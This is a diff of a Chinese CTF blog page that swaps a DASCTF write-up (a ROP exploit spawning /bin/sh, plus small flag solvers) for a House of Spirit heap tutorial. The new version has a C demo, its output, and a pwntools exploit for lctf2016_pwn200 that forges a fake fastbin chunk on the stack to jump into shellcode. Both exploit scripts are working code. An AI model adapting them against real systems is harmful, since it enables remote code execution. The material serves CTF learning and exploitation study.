@@ -15,7 +15,7 @@
   <meta name="description" content>
   <meta name="author" content="chumen77">
   <meta name="keywords" content>
-  <title>DASCTF安恒月赛(4th) ~ Chumen77&#39;s Blog</title>
+  <title>House of Spirit ~ Chumen77&#39;s Blog</title>
 
   <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
@@ -112,7 +112,7 @@
               
                 <p class="mt-3">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  星期六, 四月 25日 2020, 9:48 晚上
+                  星期五, 十月 9日 2020, 11:45 中午
                 </p>
               
 
@@ -121,7 +121,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    567 字
+                    2.1k 字
                   </span>&nbsp;
                 
 
@@ -129,7 +129,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      3 分钟
+                      10 分钟
                   </span>&nbsp;
                 
 
@@ -162,84 +162,168 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h1 id="DASCTF安恒月赛-pwn"><a href="#DASCTF安恒月赛-pwn" class="headerlink" title="DASCTF安恒月赛-pwn"></a>DASCTF安恒月赛-pwn</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开赛了，有点事情没打，晚上复现了一下。</p>
-<h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo-server"></a>echo-server</h2><pre><code class="python">[*] &#39;/ctf/work/ahys/echo server/test&#39;
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)</code></pre>
-<p>程序很简单，经典栈溢出，rop利用即可。<br>但是因为是64位的，并且是glibc2.27，发现在做的时候构造rop链总是会cursh，<br>调试发现：<br><img src="http://qiqianyun.chumen77.xyz/uPic/jfAEUD.png" srcset="/img/loading.gif" alt><br>发现这段汇编直接会让程序cursh，想起来ex师傅一篇文章分析过，64位程序rop到system拿shell的时候也会这样。但是很奇怪这个也出现了，索性尝试一波。<br>解决办法：还是加个ret，让栈对其即可。</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
-local_file  = &#39;./test&#39;
-local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;
-remote_libc = &#39;./libc.so.6&#39;
-debug = 1
+            <h1 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h1><p>House of Spirit（下面称为hos）是一个组合型漏洞的利用，是变量覆盖和堆管理机制的组合利用，<strong>关键在于能够覆盖一个堆指针变量，使其指向可控的区域</strong>，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fastbin里面，最后再分配出来的时候，就有可能改写我们目标区域（多为函数指针和<strong>返回地址</strong>）。</p>
+<h2 id="核心条件"><a href="#核心条件" class="headerlink" title="核心条件"></a>核心条件</h2><ul>
+<li>有机会覆盖一个堆指针变量，使其指向目标可控的区域</li>
+<li>能够在目标可控位置处伪造 fastbin chunk</li>
+</ul>
+<p>这样将其这个堆指针释放，会放到相应的fastbin，从而达到分配指定地址的 chunk 的目的。</p>
+<h3 id="fastbin-fake-chunk-需要绕过的检测"><a href="#fastbin-fake-chunk-需要绕过的检测" class="headerlink" title="fastbin fake chunk 需要绕过的检测"></a>fastbin fake chunk 需要绕过的检测</h3><ul>
+<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
+<li>fake chunk 地址需要对齐， <code>MALLOC_ALIGN_MASK</code></li>
+<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
+<li>fake chunk 的 <strong>next chunk</strong> 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。(这个大小还是很随意的，不必要非得是fastbin 的size 例如 :0x1234)</li>
+<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
+</ul>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()
+{
+    fprintf(stderr, &quot;This file demonstrates the house of spirit attack.n&quot;);
+  //调用一次malloc来初始化堆  
+    fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.n&quot;);
+    malloc(1);
+
+  //现在我们将覆写一个指针来指向一个伪造的fastbin域
+    fprintf(stderr, &quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.n&quot;);
+    unsigned long long *a;
+  //这个和fastbinY无关,不要被这个10所骗,fake_chunks只是一块内存
+    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
+    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
+
+  //这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始
+    fprintf(stderr, &quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]);
+
+  //这个chunk的size必须符和fastbin的要求(&lt;=128 x64位系统),PREV_INUSE位在fasybin-sized chunks中也是被忽略的,但是IS_MAPPED和NON_MAIN_AREN会引发一些问题
+    fprintf(stderr, &quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n&quot;);
+    fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n&quot;);
+    fake_chunks[1] = 0x40; // this is the size
+
+  //下一个fake chunk的size必须是合法的。 即&gt; 2 * SIZE_SZ（在x64上需要&gt; 16）和＆&lt;av-&gt; system_mem（对于main arena来说，默认为&lt;128kb）并且可以通过nextsize完整性检查。 但是我们无需符和Fastbin的大小
+    fprintf(stderr, &quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.n&quot;);
+        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
+    fake_chunks[9] = 0x1234; // nextsize
+
+  //现在我们将通过有着fake first chunks的fake区域地址来覆写我们的指针
+    fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n&quot;, &amp;fake_chunks[1]);
+  //要注意的是,chunk必须是16字节对齐的
+    fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n&quot;);
+    a = &amp;fake_chunks[2];
+
+    fprintf(stderr, &quot;Freeing the overwritten pointer.n&quot;);
+    free(a);
+  //现在下一次的malloc就将会返回我们的fake chunk了
+    fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]);
+    fprintf(stderr, &quot;malloc(0x30): %pn&quot;, malloc(0x30));
+}</code></pre>
+<p>正常的hos是需要伪造两个chunk的。</p>
+<pre><code class="c">This file demonstrates the house of spirit attack.
+Calling malloc() once so that it sets up its memory.
+We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.
+This region (memory of length: 80) contains two chunks. The first starts at 0x7ffe23a56258 and the second at 0x7ffe23a56298.
+This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
+... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. 
+The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
+Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe23a56258.
+... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
+Freeing the overwritten pointer.
+Now the next malloc will return the region of our fake chunk at 0x7ffe23a56258, which will be 0x7ffe23a56260!
+malloc(0x30): 0x7ffe23a56260</code></pre>
+<p>程序首先初始化了一下堆,然后申请了两个变量,一个是我们即将攻击的变量 a,另一个是我们的<code>fake_chunks</code></p>
+<p>程序先在<code>fake_chunks[1]</code>的地方也就是size域伪造了合法的size,0x40(满足fastbin size大小,与16字节对齐,标志位正确)</p>
+<p>之后又在下一处伪造了第二个chunk,即从<code>fake_chunks[8]</code>开始的地方,这是为什么呢,因为我们第一个fake chunk的size伪造成了0x40,那么我们第二个chunk就需要在向下0x40的地方也就是<code>fake_chunks+8</code>的地方伪造第二个chunk。</p>
+<h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>使用该技术分配 chunk 到指定地址，使目标位置成为可控区域，关键是要能够修改指定地址的前后的内容，伪造出2个堆，使其可以绕过对应的检测。</p>
+<p>还有就是要有办法覆盖堆指针，到目标地址。</p>
+<h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>开头不输入<code>\n</code>，填充48字符可以泄露出stack地址</li>
+<li>有第一段可控的栈，且可以覆盖到heap ptr</li>
+</ul>
+<pre><code class="c">int sub_400A29()
+{
+  char buf; // [rsp+0h] [rbp-40h]
+  char *dest; // [rsp+38h] [rbp-8h]
+
+  dest = (char *)malloc(0x40uLL);
+  puts(&quot;give me money~&quot;);
+  read(0, &amp;buf, 0x40uLL);
+  strcpy(dest, &amp;buf);
+  ptr = dest;
+  return sub_4009C4();
+}</code></pre>
+<ul>
+<li>一次只能申请一个堆，大小0-0x80,且先释放才能再次申请。</li>
+</ul>
+<p>保护情况，无任何保护，所以可以写shellcode，jmp 上去即可。</p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
+<li>利用可控的栈，hos 在栈上fake 一个堆，保证可以改到ret address</li>
+</ul>
+<p>可以先看一下可控栈的内存情况,<strong>此前id输入的是65</strong>：</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/Sy4TQJ.png" srcset="/img/loading.gif" alt><br>前0x40为可控区域，箭头指的方向是可以覆盖的堆指针，id的上方有一个ret address，其在输入3退出时可以跳转到。所以其为目标地址，其前面有可控的0x40的区域，后面也有一个id 0x8的可控区域，满足条件 开始构造：</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/fO0l4K.png" srcset="/img/loading.gif" alt></p>
+<p>这样free一下就会有个进入fastbin 在栈上的fake堆，申请上去即可修改到目标区域。</p>
+<ul>
+<li>修改ret addree为shellcode的地址。其可以在第一次让你输入时，放入栈中。</li>
+</ul>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
+# encoding: utf-8
+from pwn import *
+import time
+local_file  = &#39;./pwn200&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
 if debug:
     io = process(local_file)
-    libc = ELF(local_libc)
+    libc = elf.libc
 else:
-    # io = remote(&#39;node3.buuoj.cn&#39;,25390)
-    libc = ELF(remote_libc)
-
-elf = ELF(local_file)
-libc = elf.libc
-context.log_level = &#39;debug&#39;
+    io = remote(&#39;node3.buuoj.cn&#39;,26670)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
 context.arch = elf.arch
-context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;
-
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
 s      = lambda data               :io.send(data) 
 sa      = lambda delim,data         :io.sendafter(delim, data)
 sl      = lambda data               :io.sendline(data)
 sla     = lambda delim,data         :io.sendlineafter(delim, data)
-sea     = lambda delim,data         :io.sendafter(delim, data)
 r      = lambda numb=4096          :io.recv(numb)
 ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
 uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
 uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
-info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
 itr     = lambda                    :io.interactive()
-def dbg():
-    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
     gdb.attach(io)
     pause()
-pop_rdi = 0x0000000000400823# : pop rdi ; ret
-offset = 136
-start = 0x4005C0
-ret = 0x0400768
-sla(&#39;how long is your name:&#39;,&#39;500&#39;)
-payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,elf.got[&#39;read&#39;],elf.plt[&#39;printf&#39;],start])
-# dbg()
-sla(&#39;s you name?&#39;,payload)
-ru(&#39;hello &#39;)
-read = uu64(r(6))
-info_addr(&#39;printf&#39;,read)
-libc_base = read - libc.symbols[&#39;read&#39;]
-info_addr(&#39;libc_base&#39;,libc_base)
-binsh = libc_base  + libc.search(&quot;/bin/sh&quot;).next()
-system = libc_base + libc.sym[&#39;system&#39;]
-sla(&#39;how long is your name: &#39;,&#39;500&#39;)
-payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,binsh,system])
-# rec = 0x4f322 + libc_base
-# dbg()
-sla(&#39;s you name?&#39;,payload)
+
+def add(size,data):
+    sla(&#39;choice&#39;,&#39;1&#39;)
+    sla(&#39;long&#39;,str(size))
+    sa(&#39;me&#39;,str(data))
+
+def free():
+    sla(&#39;choice&#39;,&#39;2&#39;)
+
+shellcode = asm(shellcraft.sh())
+sa(&#39;u&#39;,shellcode)
+ru(&#39;\x05&#39;)
+leak_stack = uu64(r(6))
+info_addr(&#39;leak_stack&#39;,leak_stack)
+shellcode_addr = leak_stack - 0x50
+# debug()
+sla(&#39;id&#39;,&#39;65&#39;)
+payload = p64(0)*5 + p64(0x41) + p64(0) + p64(leak_stack - 0x90)
+sa(&#39;money&#39;,payload)
+free()
+payload = p64(0)*3 + p64(shellcode_addr)
+add(0x38,payload)
+sleep(0.2)
+sla(&#39;choice&#39;,&#39;3&#39;)
+# debug()
 itr()</code></pre>
-<h2 id="入门reverse"><a href="#入门reverse" class="headerlink" title="入门reverse"></a>入门reverse</h2><pre><code class="python">s = &#39;akhb~chdaZrdaZudqduvdZvvv|&#39;
-flag = &#39;&#39;
-for i in range(26):
-    flag += chr((ord(s[i]) - 1) ^ 6)
-
-print(flag)</code></pre>
-<h2 id="Encrypts"><a href="#Encrypts" class="headerlink" title="Encrypts"></a>Encrypts</h2><p>直接爆破了。</p>
-<pre><code class="python">s = [38,44,33,39,59,35,34,115,117,114,113,33,36,117,118,119,35,120,38,114,117,113,38,34,113,114,117,114,36,112,115,118,121,112,35,37,121,61]
-
-for i in range(128):
-    flag = &#39;&#39;
-    for j in range(38):
-        flag += chr(s[j] ^ i)
-    if flag[:4] == &#39;flag&#39;:
-        print(flag)
-</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/199468#h2-19" target="_blank" rel="noopener">https://www.anquanke.com/post/id/199468#h2-19</a><br><a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85357</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit</a></p>
 
             <hr>
           </div>
@@ -251,13 +335,11 @@ for i in range(128):
               <span>
                 <i class="iconfont icon-tag"></i>
                 
-                  <a class="hover-with-bg" href="/tags/re">re</a>
-                
                   <a class="hover-with-bg" href="/tags/pwn">pwn</a>
                 
-                  <a class="hover-with-bg" href="/tags/rop">rop</a>
+                  <a class="hover-with-bg" href="/tags/House%E7%B3%BB%E5%88%97">House系列</a>
                 
-                  <a class="hover-with-bg" href="/tags/uaf">uaf</a>
+                  <a class="hover-with-bg" href="/tags/heap">heap</a>
                 
               </span>
             
@@ -413,7 +495,7 @@ for i in range(128):
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "DASCTF安恒月赛(4th)&nbsp;",
+        "House of Spirit&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
